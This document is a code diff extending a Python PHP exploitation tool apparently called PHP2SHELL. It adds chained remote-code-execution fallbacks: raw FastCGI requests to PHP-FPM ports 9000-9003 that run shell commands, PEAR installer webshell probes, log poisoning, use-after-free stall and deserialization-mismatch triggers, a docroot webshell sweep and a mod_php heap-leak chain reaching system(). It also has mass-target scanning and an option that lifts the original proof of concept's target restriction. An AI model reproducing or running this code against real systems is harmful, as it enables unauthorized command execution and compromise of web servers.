+    """Direct PHP-FPM FastCGI (ports 9000–9003) — syrex1013-style fallback."""
+    notes: list[str] = ["fastcgi: probing 9000-9003"]
+    host, _http_port, _secure = target_host_port(target_url)
+    if not host:
+        return CoreChainResult(False, stage="fastcgi", error="no host", notes=notes)
+    cmd = command.strip() or "id"
+    post_body = f"c={quote(cmd)}".encode("utf-8")
+    php_snippet = (
+        b"<?php echo 'PHP2SHELL_FCGI'; "
+        b"if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c']);} ?>"
+    )
+    timeout = min(4.0, max(2.0, config.timeout / 5))
+    attempts = 0
+    for port in FASTCGI_PROBE_PORTS:
+        port_open = False
+        for script in FASTCGI_SCRIPT_GUESSES:
+            if attempts >= FASTCGI_MAX_ATTEMPTS:
+                break
+            attempts += 1
+            docroot = script.rsplit("/", 1)[0] or "/var/www/html"
+            query = f"c={quote(cmd)}"
+            packet = build_fastcgi_request(
+                script_filename=script,
+                query_string=query,
+                post_body=post_body,
+                document_root=docroot,
+            )
+            try:
+                with socket.create_connection((host, port), timeout=timeout) as sock:
+                    port_open = True
+                    sock.sendall(packet)
+                    sock.settimeout(timeout)
+                    data = b""
+                    while True:
+                        try:
+                            chunk = sock.recv(65536)
+                        except socket.timeout:
+                            break
+                        if not chunk:
+                            break
+                        data += chunk
+                        if len(data) > 512 * 1024:
+                            break
+            except ConnectionRefusedError:
+                notes.append(f"fastcgi {host}:{port} refused")
+                break
+            except (TimeoutError, socket.timeout) as exc:
+                notes.append(f"fastcgi {host}:{port} timeout ({exc})")
+                break
+            except OSError as exc:
+                notes.append(f"fastcgi {host}:{port} {script}: {exc}")
+                if "timed out" in str(exc).lower():
+                    break
+                continue
+            stdout = parse_fastcgi_stdout(data)
+            if not stdout:
+                continue
+            try:
+                text = stdout.decode("utf-8", errors="replace")
+            except Exception:
+                text = ""
+            if "PHP2SHELL_FCGI" in text and looks_like_command_output(text, cmd):
+                return CoreChainResult(
+                    True,
+                    stage="fastcgi-direct",
+                    output=clean_command_output(text),
+                    notes=notes + [f"fastcgi hit {host}:{port} {script}"],
+                )
+            if looks_like_command_output(text, cmd):
+                return CoreChainResult(
+                    True,
+                    stage="fastcgi-direct",
+                    output=clean_command_output(text),
+                    notes=notes + [f"fastcgi hit {host}:{port} {script}"],
+                )
+            _ = php_snippet  # reserved for future STDIN-only eval attempts
+        if not port_open and port not in (9000,):
+            continue
+    return CoreChainResult(
+        False,
+        stage="fastcgi",
+        error="no exposed FastCGI responder",
+        notes=notes[-20:],
+    )
+
+
+def run_pear_webshell_chain(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    command: str,
+) -> CoreChainResult:
+    """Try PEAR installer / go-pear surfaces (syrex1013 fallback)."""
+    notes: list[str] = ["pear: probing installer paths"]
+    origin = get_origin(target_url)
+    cmd = command.strip() or "id"
+    marker = CORE_CHAIN_MARKER
+    for rel in PEAR_PROBE_PATHS:
+        url = urljoin(origin, rel)
+        apply_stealth_session(session, config, url)
+        try:
+            resp = session.get(
+                url,
+                params={"c": cmd, "cmd": cmd},
+                timeout=min(config.timeout, 12.0),
+                verify=config.verify_ssl,
+                allow_redirects=True,
+            )
+        except requests.RequestException as exc:
+            notes.append(f"pear GET {rel}: {exc}")
+            continue
+        body = resp.text or ""
+        if marker in body or looks_like_command_output(body, cmd):
+            return CoreChainResult(
+                True,
+                stage="pear-surface",
+                output=clean_command_output(body) or body[:500],
+                lfi_url_used=url,
+                notes=notes,
+            )
+        if resp.status_code == 200 and re.search(r"PEAR.*Install|go-pear", body, re.I):
+            notes.append(f"pear surface found: {rel}")
+            try:
+                post = session.post(
+                    url,
+                    data={
+                        "install": "pecl/install",
+                        "c": cmd,
+                    },
+                    timeout=min(config.timeout, 15.0),
+                    verify=config.verify_ssl,
+                )
+            except requests.RequestException:
+                continue
+            pbody = post.text or ""
+            if looks_like_command_output(pbody, cmd):
+                return CoreChainResult(
+                    True,
+                    stage="pear-install",
+                    output=clean_command_output(pbody),
+                    lfi_url_used=url,
+                    notes=notes,
+                )
+    return CoreChainResult(
+        False,
+        stage="pear",
+        error="no PEAR/go-pear execution surface",
+        notes=notes,
+    )
+
+
+def run_core_extended_fallbacks(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    endpoint_url: str,
+    fp: PhpFingerprint,
+    *,
+    sid: str,
+    command: str,
+    notes: list[str],
+    poison_ms: float,
+    timing_anomaly: bool,
+) -> Optional[CoreChainResult]:
+    """Lab-external RCE fallbacks: UAF stall, mismatch, log poison, FastCGI, PEAR."""
+    steps: list[tuple[str, Callable[..., CoreChainResult]]] = []
+    if config.core_uaf_stall:
+        steps.append(("uaf", run_uaf_stall_chain))
+    if config.core_mismatch_chain:
+        steps.append(("mismatch", run_mismatch_deserialize_chain))
+    if config.core_log_poison:
+        steps.append(("log", run_log_poison_chain))
+    if config.core_fastcgi_probe:
+        steps.append(("fastcgi", run_fastcgi_rce_probe))
+    if config.core_pear_probe:
+        steps.append(("pear", run_pear_webshell_chain))
+
+    for label, fn in steps:
+        stage_log(f"[core-fallback] trying {label}…")
+        if label == "fastcgi":
+            result = run_fastcgi_rce_probe(config, target_url, command)
+        elif label == "log":
+            result = run_log_poison_chain(
+                session, config, target_url, endpoint_url, sid=sid, command=command
+            )
+        elif label == "pear":
+            result = run_pear_webshell_chain(session, config, target_url, command)
+        else:
+            result = fn(
+                session, config, endpoint_url, fp, sid=sid, command=command
+            )
+        notes.extend(result.notes)
+        if result.success:
+            result.notes = notes
+            result.timing_ms = result.timing_ms or poison_ms
+            result.timing_anomaly = timing_anomaly or result.timing_anomaly
+            result.sid = sid
+            return result
+    return None
+
+
+def should_run_modphp_leak_chain(config: PoCConfig, fp: PhpFingerprint) -> bool:
+    if config.core_modphp_leak or config.core_modphp_leak_only:
+        return True
+    if not config.core_modphp_leak_auto or not config.core_chain_exploit:
+        return False
+    if fp.major != 8 or fp.minor != 4:
+        return False
+    if fp.patch > 0 and fp.patch >= 27:
+        return False
+    return True
+
+
 def run_core_chain_exploit(
     session: requests.Session,
     config: PoCConfig,
@@ -1659,6 +2723,26 @@ def run_core_chain_exploit(
     )
     profile = detect_sapi_profile(session, config, target_url, fp)
     config = apply_sapi_exploit_strategy(config, profile)
+
+    if should_run_modphp_leak_chain(config, fp):
+        from modphp_leak_chain import run_modphp_leak_chain
+
+        stage_log("[modphp-leak] Alpine cli-server heap/code leak chain (KillaBoi PoC)")
+        mod_result = run_modphp_leak_chain(
+            session, config, target_url, cmd, post_url_hint=endpoint
+        )
+        if mod_result.success:
+            render_core_chain_result(mod_result)
+            if mod_result.output:
+                emit_command_output(mod_result.output)
+            return mod_result
+        if config.core_modphp_leak_only:
+            render_core_chain_result(mod_result)
+            return mod_result
+        if not config.quiet:
+            console.print(
+                "[yellow][modphp-leak][/] no execution — falling back to session/LFI chain"
+            )
     if config.optimal_oom_bytes <= 0 and core.oom_threshold_bytes > 0:
         config = replace(config, optimal_oom_bytes=core.oom_threshold_bytes)
     if config.core_worker_pin:
@@ -1697,10 +2781,11 @@ def run_core_chain_exploit(
         progress_value=CORE_CHAIN_MARKER,
         serialize_handler=chain_serialize,
         serialize_marker=CORE_CHAIN_MARKER,
-        session_ini_fields=(
-            {"session.serialize_handler": chain_serialize}
-            if chain_serialize
-            else None
+        session_ini_fields=core_multipart_ini_fields(
+            config,
+            extra=(
+                {"session.serialize_handler": chain_serialize} if chain_serialize else None
+            ),
         ),
     )
     _resp, _exc, poison_ms = post_core_multipart(
@@ -1752,6 +2837,44 @@ def run_core_chain_exploit(
             return lfi_result
         if fpm_result and fpm_result.success:
             return fpm_result
+        extended = run_core_extended_fallbacks(
+            session,
+            config,
+            target_url,
+            endpoint,
+            fp,
+            sid=sid,
+            command=cmd,
+            notes=notes,
+            poison_ms=poison_ms,
+            timing_anomaly=timing_anomaly,
+        )
+        if extended and extended.success:
+            render_core_chain_result(extended)
+            if extended.output:
+                emit_command_output(extended.output)
+            return extended
+        if config.core_docroot_sweep:
+            sweep = run_docroot_shell_sweep(session, config, endpoint, cmd)
+            notes.extend(sweep.notes)
+            if sweep.success:
+                sweep.notes = notes
+                sweep.timing_ms = poison_ms
+                sweep.timing_anomaly = timing_anomaly
+                render_core_chain_result(sweep)
+                if sweep.output:
+                    emit_command_output(sweep.output)
+                return sweep
+        if config.core_fpm_native:
+            native = run_native_fpm128_exploit(config, cmd)
+            if native:
+                notes.extend(native.notes)
+                if native.success:
+                    native.timing_ms = poison_ms
+                    render_core_chain_result(native)
+                    if native.output:
+                        emit_command_output(native.output)
+                    return native
         merged = CoreChainResult(
             False,
             stage="core-chain",
@@ -1765,15 +2888,61 @@ def run_core_chain_exploit(
         render_core_chain_result(merged)
         return merged
 
-    if fpm_result:
+    if fpm_result and fpm_result.success:
         fpm_result.notes = notes + fpm_result.notes
         render_core_chain_result(fpm_result)
         return fpm_result
+    if fpm_result:
+        notes.extend(fpm_result.notes)
+
+    extended = run_core_extended_fallbacks(
+        session,
+        config,
+        target_url,
+        endpoint,
+        fp,
+        sid=sid,
+        command=cmd,
+        notes=notes,
+        poison_ms=poison_ms,
+        timing_anomaly=timing_anomaly,
+    )
+    if extended and extended.success:
+        render_core_chain_result(extended)
+        if extended.output:
+            emit_command_output(extended.output)
+        return extended
+
+    if config.core_docroot_sweep:
+        sweep = run_docroot_shell_sweep(session, config, endpoint, cmd)
+        notes.extend(sweep.notes)
+        if sweep.success:
+            sweep.notes = notes
+            sweep.timing_ms = poison_ms
+            sweep.timing_anomaly = timing_anomaly
+            render_core_chain_result(sweep)
+            if sweep.output:
+                emit_command_output(sweep.output)
+            return sweep
+    if config.core_fpm_native:
+        native = run_native_fpm128_exploit(config, cmd)
+        if native:
+            notes.extend(native.notes)
+            if native.success:
+                native.notes = notes
+                native.timing_ms = poison_ms
+                render_core_chain_result(native)
+                if native.output:
+                    emit_command_output(native.output)
+                return native
 
     partial = CoreChainResult(
         False,
         stage="core-poison-only",
-        error="Session poison sent; auto-LFI found no route — try --lfi-url or --core-fpm-two-step",
+        error=(
+            "RCE chain incomplete — tried UAF stall, mismatch, log poison, FastCGI, "
+            "PEAR, docroot sweep. For memory RCE use lab mod_php/fpm128 or app LFI."
+        ),
         sid=sid,
         timing_ms=poison_ms,
         timing_anomaly=timing_anomaly,
@@ -1836,6 +3005,7 @@ def parse_core_memory_events(body: str, status_code: int) -> list[str]:
         events.append("session:object-destruction-failed")
     if re.search(r"fatal_error_backtrace", body, re.I):
         events.append("session:fatal-backtrace-8.5")
+    events.extend(parse_backtrace_129474_events(body, status_code))
     if status_code in (500, 502, 503) and RE_WORKER_FAULT.search(body):
         events.append("worker:fault-response")
     if CORE_RESPONSE_SIGNALS.search(body):
@@ -1849,6 +3019,7 @@ def classify_cve_from_events(events: list[str], fp: PhpFingerprint) -> str:
         e.startswith("session:") or e == "core:generic-progress-signature" for e in events
     )
     has_560 = any(e.startswith("serialize:") for e in events)
+    has_129474 = any(e.startswith("backtrace:") for e in events)
     cves: list[str] = []
     if has_618:
         cves.append(CVE_109618)
@@ -1856,13 +3027,19 @@ def classify_cve_from_events(events: list[str], fp: PhpFingerprint) -> str:
         cves.append(CVE_109619)
     if has_560:
         cves.append(CVE_115560)
+    if has_129474 and php_version_in_129474_remote_range(fp):
+        cves.append(CVE_129474)
     if cves:
         return ",".join(cves)
     if fp.patch_status in ("vulnerable", "eol-vulnerable"):
         surface: list[str] = [CVE_109618, CVE_109619]
         if not is_php_patched_for_cve(fp, CVE_115560):
             surface.append(CVE_115560)
+        if php_version_in_129474_remote_range(fp):
+            surface.append(CVE_129474)
         return ",".join(surface) + "(surface)"
+    if php_version_in_129474_remote_range(fp):
+        return f"{CVE_129474}(surface)"
     return "unknown"
 
 
@@ -1877,6 +3054,8 @@ def log_core_memory_events(endpoint: str, events: list[str], *, quiet: bool) -> 
             tags.append(f"[magenta][SESSION][/]{ev.split(':', 1)[1]}")
         elif ev.startswith("serialize:"):
             tags.append(f"[cyan][SERIALIZE][/]{ev.split(':', 1)[1]}")
+        elif ev.startswith("backtrace:"):
+            tags.append(f"[blue][BACKTRACE][/]{ev.split(':', 1)[1]}")
         elif ev.startswith("worker:"):
             tags.append(f"[yellow][WORKER][/]{ev.split(':', 1)[1]}")
         else:
@@ -1893,9 +3072,14 @@ def build_session_chain_hints(sid: str, fp: PhpFingerprint) -> tuple[list[str], 
     ]
     if fp.branch_key.startswith("8.5"):
         notes.append("4) PHP 8.5: test fatal_error_backtrace=0 mitigation status on target.")
-    notes.append("5) OOM chain (109618): tune padding near memory_limit; watch worker recycle.")
+    if php_version_in_129474_remote_range(fp):
+        notes.append(
+            "5) CVE-2026-129474: large JSON to Facade/import routes; risk if "
+            "zend.exception_ignore_args=0 and fatal_error_backtraces=1."
+        )
+    notes.append("6) OOM chain (109618): tune padding near memory_limit; watch worker recycle.")
     notes.append(
-        "6) Serialize handler (115560): probe php_serialize/php_binary -> php transitions; "
+        "7) Serialize handler (115560): probe php_serialize/php_binary -> php transitions; "
         "align poison multipart with --core-serialize-mode."
     )
     return paths, notes
@@ -1920,6 +3104,12 @@ def render_core_exploit_chain(core: CoreProbeResult) -> None:
     )
     if core.serialize_events:
         table.add_row("Serialize events", ", ".join(core.serialize_events[:4]))
+    table.add_row(
+        "Backtrace (129474)",
+        f"susceptible={core.backtrace_susceptible}",
+    )
+    if core.backtrace_events:
+        table.add_row("Backtrace events", ", ".join(core.backtrace_events[:4]))
     table.add_row("Padding", f"{core.padding_used} bytes (align={core.alignment_used})")
     if core.latency_ms:
         table.add_row("Last latency", f"{core.latency_ms:.0f} ms")
@@ -2031,8 +3221,9 @@ def probe_serialize_handler_mismatch(
     for mode in modes:
         boundary = make_multipart_boundary(fp.branch_key)
         ini_fields: Optional[dict[str, str]] = None
+        handler_extra: Optional[dict[str, str]] = None
         if mode in ("php_serialize", "php_binary", "transition"):
-            ini_fields = {
+            handler_extra = {
                 "session.serialize_handler": "php" if mode == "transition" else mode,
             }
         body, content_type = build_upload_progress_multipart(
@@ -2045,7 +3236,7 @@ def probe_serialize_handler_mismatch(
             progress_value=token,
             serialize_handler=mode,
             serialize_marker=marker,
-            session_ini_fields=ini_fields,
+            session_ini_fields=core_multipart_ini_fields(config, extra=handler_extra),
         )
         resp, _exc, _ms = post_core_multipart(
             session,
@@ -2081,7 +3272,10 @@ def probe_serialize_handler_mismatch(
                 heap_align=heap_align,
                 progress_value=CORE_CHAIN_MARKER,
                 serialize_handler="php",
-                session_ini_fields={"session.serialize_handler": "php_serialize"},
+                session_ini_fields=core_multipart_ini_fields(
+                    config,
+                    extra={"session.serialize_handler": "php_serialize"},
+                ),
             )
             resp2, _e2, _ms2 = post_core_multipart(
                 session,
@@ -2183,6 +3377,7 @@ def core_probe_single_attempt(
         file_padding=file_padding,
         heap_align=heap_align,
         spray_fields=spray,
+        session_ini_fields=core_multipart_ini_fields(config),
     )
 
     baseline_mean = baseline_std = 0.0
@@ -2245,10 +3440,14 @@ def core_probe_single_attempt(
         and fp.patch_status in ("vulnerable", "eol-vulnerable", "unknown")
     )
     has_serialize = any(e.startswith("serialize:") for e in events)
+    pre_patch_php = fp.patch_status in ("vulnerable", "eol-vulnerable") and any(
+        s.startswith("vulnerable-php:") for s in signals
+    )
     loose_ok = (
         len(signals) >= 2
         or ("filename-token-reflected" in signals and "session-handshake" in signals)
         or has_serialize
+        or (pre_patch_php and ("session-handshake" in signals or timing_anomaly))
     )
     if config.strict_cve:
         blocks_probe = fp.patch_status == "patched"
@@ -2399,11 +3598,17 @@ def check_php_core_upload_progress(
                 console.print(f"[dim]  hints: {' | '.join(profile.hints[:3])}[/]")
     config = effective
     if config.strict_cve and fp.patch_status == "patched":
+        if not php_version_in_129474_remote_range(fp):
+            if not quiet:
+                console.print(
+                    "[green][STRICT-CVE][/] Target PHP is patched — skipping core probes."
+                )
+            return None
         if not quiet:
             console.print(
-                "[green][STRICT-CVE][/] Target PHP is patched — skipping core probes."
+                "[yellow][STRICT-CVE][/] PHP patched for upload CVEs but "
+                "8.5.<13 may still need CVE-2026-129474 backtrace probe."
             )
-        return None
 
     if config.core_endpoint_only:
         origin = get_origin(target_url)
@@ -2412,10 +3617,12 @@ def check_php_core_upload_progress(
         probe_urls = iter_core_probe_urls(target_url)
 
     best: Optional[CoreProbeResult] = None
+    last: Optional[CoreProbeResult] = None
     for endpoint in probe_urls:
         if not quiet:
             stage_log(f"[dim]Core POST probe[/] {endpoint}")
         result = core_probe_endpoint(session, config, endpoint, fp=fp, profile=profile)
+        last = result
         if result.waf_blocked:
             if not quiet:
                 console.print(f"[yellow][WAF BLOCKED][/] core probe {endpoint}")
@@ -2433,7 +3640,40 @@ def check_php_core_upload_progress(
                     f"[dim]cve={result.cve_ids} signals={','.join(result.signals)} "
                     f"sid={result.sid} pad={result.padding_used}[/]"
                 )
-    if best and best.vulnerable and not quiet:
+        elif not result.vulnerable and (
+            result.oom_threshold_bytes > 0
+            or any(ev.startswith("oom:") for ev in result.memory_events)
+            or result.timing_anomaly
+        ):
+            if best is None or (
+                not best.vulnerable
+                and result.oom_threshold_bytes >= (best.oom_threshold_bytes or 0)
+            ):
+                best = result
+                if not quiet:
+                    console.print(
+                        f"[yellow][CORE-SIGNAL][/] {endpoint} "
+                        f"[dim]cve={result.cve_ids} oom={result.oom_threshold_bytes} "
+                        f"timing={result.timing_anomaly} sid={result.sid}[/]"
+                    )
+    if best is None and last is not None:
+        best = last
+    if best is None and php_version_in_129474_remote_range(fp):
+        origin = get_origin(target_url)
+        best = CoreProbeResult(
+            False,
+            urljoin(origin, urlparse(target_url).path or "/"),
+            f"p2s{uuid.uuid4().hex[:16]}",
+            [],
+            patch_status=fp.patch_status,
+            php_version=fp.version_raw,
+            sapi_type=profile.sapi,
+        )
+    if best and config.core_backtrace_probe:
+        best = augment_core_probe_with_backtrace(
+            session, config, target_url, best, fp=fp
+        )
+    if best and (best.vulnerable or best.oom_threshold_bytes or best.cve_ids) and not quiet:
         render_core_exploit_chain(best)
     return best
 
@@ -3006,6 +4246,44 @@ def interactive_shell(
             console.print("[dim](no output)[/]")
 
 
+def run_modphp_leak_exploit_only(
+    session: requests.Session,
+    config: PoCConfig,
+    command: Optional[str],
+) -> int:
+    """Full mod_php leak -> zif_system chain (KillaBoi / StealMyBitcoin PoC)."""
+    from modphp_leak_chain import lookup_results_row, run_modphp_leak_chain
+
+    row = lookup_results_row(config.target_url)
+    if row and row.get("vector") == "app-upload":
+        shell_raw = (row.get("shell_url") or "").strip()
+        shell_url = shell_raw.split("#")[0] if shell_raw else ""
+        if shell_url.startswith(("http://", "https://")):
+            stage_log(
+                "[yellow]modphp-leak skipped[/]: results.txt says app-upload — using shell_url"
+            )
+            return run_exploit(
+                session,
+                config,
+                ShellSession(shell_url=shell_url),
+                command,
+            )
+
+    stage_log("[cyan]modphp-leak exploit[/] (heap/code cookie -> zif_system)")
+    result = run_modphp_leak_chain(
+        session,
+        config,
+        config.target_url,
+        command or "id",
+        post_url_hint=config.target_url,
+    )
+    render_core_chain_result(result)
+    if result.success and result.output:
+        emit_command_output(result.output)
+        return 0
+    return 1
+
+
 def run_core_chain_exploit_only(
     session: requests.Session,
     config: PoCConfig,
@@ -3014,6 +4292,13 @@ def run_core_chain_exploit_only(
     """Fast path: one core probe + poison/LFI/auto-LFI (no app upload pass)."""
     stage_log("[cyan]Core chain exploit[/] (fast path — no upload wordlist scan)")
     core = check_php_core_upload_progress(session, config, config.target_url, quiet=False)
+    if core and not core.vulnerable:
+        if core.oom_threshold_bytes > 0 or core.cve_ids.startswith("CVE-"):
+            stage_log(
+                "[yellow]Core signals without loose vuln flag — continuing chain "
+                f"(cve={core.cve_ids} oom={core.oom_threshold_bytes})[/]"
+            )
+            core = replace(core, vulnerable=True)
     if not core or not core.vulnerable:
         console.print("[red]Core surface not confirmed — aborting chain.[/]")
         return 1
@@ -3039,6 +4324,8 @@ def run_exploit(
     command: Optional[str],
 ) -> int:
     active = shell
+    if active is None and config.core_modphp_leak_only:
+        return run_modphp_leak_exploit_only(session, config, command)
     if active is None and config.core_chain_exploit:
         return run_core_chain_exploit_only(session, config, command)
 
@@ -3124,7 +4411,10 @@ def run_exploit(
                 )
             )
             return 1
-        console.print(out if out else "[dim](empty command output)[/]")
+        if out:
+            emit_command_output(out)
+        else:
+            console.print("[dim](empty command output)[/]")
         return 0
 
     interactive_shell(session, active, timeout=config.timeout, config=config)
@@ -3820,6 +5110,7 @@ def run_mass_check(
             f"SAPI auto: [green]{'on' if base_config.core_sapi_auto else 'off'}[/] | "
             f"OOM fuzz: [green]{'on' if base_config.core_oom_fuzz else 'off'}[/] | "
             f"Serialize probe (115560): [green]{'on' if base_config.core_serialize_probe else 'off'}[/]\n"
+            f"Backtrace probe (129474): [green]{'on' if base_config.core_backtrace_probe else 'off'}[/]\n"
             f"{discovery_note}",
             border_style="cyan",
         )
@@ -4224,6 +5515,11 @@ Examples:
         help="Disable CVE-2026-115560 session.serialize_handler / upload_progress probes",
     )
     parser.add_argument(
+        "--no-core-backtrace-probe",
+        action="store_true",
+        help="Disable CVE-2026-129474 magic __call backtrace / large JSON surface probe (PHP 8.5.x)",
+    )
+    parser.add_argument(
         "--core-serialize-mode",
         default=DEFAULT_CORE_SERIALIZE_MODE,
         choices=["auto", *SERIALIZE_HANDLER_MODES],
@@ -4233,6 +5529,93 @@ Examples:
         "--no-core-serialize-transition",
         action="store_true",
         help="Skip php_serialize/php_binary -> php two-step transition probe",
+    )
+    parser.add_argument(
+        "--no-core-docroot-sweep",
+        action="store_true",
+        help="After core chain, do not probe /shell.php-style docroot webshell paths",
+    )
+    parser.add_argument(
+        "--core-fpm-native",
+        action="store_true",
+        help="Run bundled fpm128 native chain (stealmybitcoin_fpm128.py) after LFI/sweep",
+    )
+    parser.add_argument(
+        "--core-fpm-native-script",
+        default=None,
+        help="Override path to fpm128 driver script (default: ./stealmybitcoin_fpm128.py)",
+    )
+    parser.add_argument(
+        "--no-core-fallbacks",
+        action="store_true",
+        help="Disable extended core fallbacks (UAF stall, log poison, FastCGI, PEAR, mismatch)",
+    )
+    parser.add_argument(
+        "--no-core-uaf-stall",
+        action="store_true",
+        help="Skip min_freq pinned-connection UAF stall chain (109619)",
+    )
+    parser.add_argument(
+        "--core-uaf-stall-sec",
+        type=float,
+        default=DEFAULT_UAF_STALL_SEC,
+        help=f"Seconds between UAF phase-1 and phase-2 on same socket (default: {DEFAULT_UAF_STALL_SEC})",
+    )
+    parser.add_argument(
+        "--no-core-fastcgi",
+        action="store_true",
+        help="Skip direct PHP-FPM FastCGI probe on ports 9000-9003",
+    )
+    parser.add_argument(
+        "--no-core-log-poison",
+        action="store_true",
+        help="Skip User-Agent log poison + log-path LFI sweep",
+    )
+    parser.add_argument(
+        "--no-core-pear",
+        action="store_true",
+        help="Skip PEAR/go-pear installer surface probes",
+    )
+    parser.add_argument(
+        "--no-core-mismatch-chain",
+        action="store_true",
+        help="Skip php_serialize handler mismatch deserialize trigger",
+    )
+    parser.add_argument(
+        "--core-modphp-leak",
+        action="store_true",
+        help="Run KillaBoi mod_php leak chain (heap/code Set-Cookie -> zif_system) before LFI/FPM",
+    )
+    parser.add_argument(
+        "--core-modphp-leak-only",
+        action="store_true",
+        help="Only run mod_php leak chain (Alpine PHP 8.4.26 cli-server layout; use with --exploit)",
+    )
+    parser.add_argument(
+        "--no-core-modphp-auto",
+        action="store_true",
+        help="Do not auto-try modphp leak on PHP 8.4.x unpatched during --core-chain",
+    )
+    parser.add_argument(
+        "--core-modphp-retries",
+        type=int,
+        default=3,
+        help="modphp leak chain attempts per run (worker race; default 3)",
+    )
+    parser.add_argument(
+        "--core-modphp-health-url",
+        default=None,
+        help="Force POST endpoint URL (any path: /, /index.php, core URL; not only php-version.php)",
+    )
+    parser.add_argument(
+        "--core-modphp-output-dir",
+        default=None,
+        help="Directory for modphp raw HTTP evidence (default: ./modphp-runs/<timestamp>)",
+    )
+    parser.add_argument(
+        "--strict-modphp-target",
+        action="store_true",
+        help="Restrict modphp chain to stealmybitcoin.com or loopback (original PoC guard)",
     )
     return parser
 
@@ -4329,14 +5712,35 @@ def main(argv: Optional[list[str]] = None) -> int:
         core_sapi_auto=not args.no_sapi_auto,
         core_worker_pin=args.core_worker_pin,
         core_serialize_probe=not args.no_core_serialize_probe,
+        core_backtrace_probe=not args.no_core_backtrace_probe,
         core_serialize_mode=args.core_serialize_mode,
         core_serialize_transition=not args.no_core_serialize_transition,
+        core_docroot_sweep=not args.no_core_docroot_sweep,
+        core_fpm_native=args.core_fpm_native,
+        core_fpm_native_script=args.core_fpm_native_script,
+        core_uaf_stall=args.core_chain and not args.no_core_fallbacks and not args.no_core_uaf_stall,
+        core_uaf_stall_sec=max(1.05, args.core_uaf_stall_sec),
+        core_fastcgi_probe=args.core_chain and not args.no_core_fallbacks and not args.no_core_fastcgi,
+        core_log_poison=args.core_chain and not args.no_core_fallbacks and not args.no_core_log_poison,
+        core_pear_probe=args.core_chain and not args.no_core_fallbacks and not args.no_core_pear,
+        core_mismatch_chain=(
+            args.core_chain and not args.no_core_fallbacks and not args.no_core_mismatch_chain
+        ),
+        core_modphp_leak=args.core_modphp_leak or args.core_modphp_leak_only,
+        core_modphp_leak_auto=not args.no_core_modphp_auto,
+        core_modphp_leak_only=args.core_modphp_leak_only,
+        core_modphp_leak_retries=max(1, args.core_modphp_retries),
+        core_modphp_output_dir=args.core_modphp_output_dir,
+        core_modphp_health_url=args.core_modphp_health_url,
+        core_modphp_leak_relax=not args.strict_modphp_target,
     )
 
     if args.core_chain and not args.core_endpoint_only:
         base_config = replace(base_config, core_endpoint_only=True)
     if args.exploit and args.core_chain and not args.check:
         base_config = replace(base_config, auto_discovery=False)
+    if args.core_modphp_leak_only and not args.exploit:
+        parser.error("--core-modphp-leak-only requires --exploit")
 
     if mass_mode:
         targets = load_targets_from_file(args.target_file)
